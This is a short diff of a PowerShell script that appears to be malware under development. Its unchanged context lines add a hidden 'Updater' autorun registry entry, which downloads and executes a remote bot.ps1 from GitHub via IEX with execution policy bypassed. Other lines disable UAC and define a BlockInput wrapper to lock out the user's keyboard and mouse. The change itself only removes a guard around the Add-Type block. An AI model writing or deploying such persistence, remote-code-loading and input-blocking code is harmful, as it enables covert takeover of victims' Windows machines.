@@ -4,8 +4,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/bot.ps1 -UseBasicParsing)"' -PropertyType String -Force
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
-if (-not ([System.Management.Automation.PSTypeName]'InputBlocker').Type) {
-    Add-Type @"
+Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 public class InputBlocker {
@@ -13,7 +12,6 @@ public class InputBlocker {
     public static extern bool BlockInput(bool fBlockIt);
 }
 "@
-}
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.Net.Http
